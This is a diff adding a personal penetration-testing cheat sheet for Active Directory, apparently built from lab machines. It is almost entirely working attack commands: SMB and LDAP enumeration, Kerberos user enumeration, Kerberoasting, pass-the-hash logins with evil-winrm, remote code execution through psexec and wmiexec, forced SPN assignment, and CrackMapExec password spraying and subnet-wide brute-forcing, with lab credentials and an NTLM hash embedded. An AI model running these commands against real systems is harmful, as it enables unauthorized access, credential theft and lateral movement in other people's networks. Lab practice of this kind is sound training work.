@@ -1,0 +1,89 @@
+[[[smbclient +]]]]]]
+#Let's try to login Users
+smbclient -W active.htv -U SVC_TGS //active.htb/Users
+smbclient //10.10.10.248/Users -U Tiffany.Molina%NewIntelligenceCorpUser9876
+#Share find with authentication
+smbclient -L -U [Domain\]Username[%Password]
+smbclient -L //10.10.229.184/ -U spookysec.local/svc-admin%management2005
+smbmap -u svc-admin -p management2005 -d . -H 10.10.229.184   
+
+[[#LDAP Enum]]
+ldapsearch -H ldap://support.htb -x -s base namingcontexts
+ldapsearch -H ldap://support.htb -x -b "DC=support,DC=htb"
+ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" | grep -B10 -A5 info
+#Or use ldapdomaindump
+ldapdomaindump -u support.htb\\ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' support.htb -o ldap
+cat domain_users.json | grep -A5 info
+
+[[#Kerbrute]]
+kerbrute userenum -d intelligence.htb --dc 10.129.163.131 usernames
+#PowerView
+.  .\PoserView.ps1
+
+========================================================================================================
+[[[[[[[[[[[evil-winrm]]]]]]]]]]]]]]]]]
+evil-winrm -i 10.10.11.132 -u oliver -p c1cdfun_d2434
+
+#Login with hash
+#administrator hash look like:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+evil-winrm -i 10.10.229.184 -u administrator -H 0e0363213e37b94221497260b0bcb4fc
+
+========================================================================================================
+[[[[[[[[#Impacket +]]]]]]]
+#Dumpt TGT
+GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
+#Psexec
+psexec.py active.htb/Administrator:Ticketmaster1968@active.htb
+psexec.py administrator@active.htb
+#wmiexec.py
+wmiexec.py 'search.htb/tristan.davies:P@ssw0rd!'@10.10.11.129
+
+#Get all users
+impacket-GetADUsers -all -dc-ip 10.10.11.173 support.htb/ldap:'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
+#Add an SPN to maria's account as bloodhound suggested
+Set-DomainObject -Identity maria -SET @{serviceprincipalname='nonexistent/ALEX'}
+#Check maria serviceprincipalname
+Get-DomainUser maria
+
+========================================================================================================
+[[[[[[[[[[[[[crackmapexec +]]]]]]]]]]]]]]]]]]]
+#Most Used
+crackmapexec winrm 10.10.10.203 -u users.txt -p passwords.txt
+crackmapexec winrm 10.10.10.203 -u users.txt -p passwords.txt --no-bruteforce
+crackmapexec winrm 10.10.10.203 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
+
+crackmapexec smb 10.10.10.203
+crackmapexec smb 10.10.10.203 --users
+crackmapexec smb 10.10.10.203 --shares
+crackmapexec smb intelligence.htb -u allusers -p 'NewIntelligenceCorpUser9876'
+crackmapexec smb intelligence.htb -u Tiffany.Monina -p passwords.txt
+crackmapexec smb intelligence.htb -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' --shares
+----------------------------------------------------------------------------------------------
+crackmapexec smb 192.168.1.0/24
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987'
+#Users
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --users
+#Groups
+crackmapexec smb 192.168.1.105  -u 'Administrator' -p 'Ignite@987' --groups
+#Text files
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --spider C\$ --pattern txt
+#Log Files
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --spider C\$ --pattern log
+#Shares
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --shares
+#Sessions
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --sessions
+#Password Policies
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --pass-pol
+#Drives
+crackmapexec smb 192.168.1.105 -u 'Administrator' -p 'Ignite@987' --disks
+
+#Bruteforce: 
+#Username
+crackmapexec smb 192.168.1.0/24 -u "kavish" "Administrator" -p "Ignite@987"
+#Password
+crackmapexec smb 192.168.1.0/24 -u "Administrator" -p "password1" "password2" "Ignite@987"
+
+#Dictionary Attack
+crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt
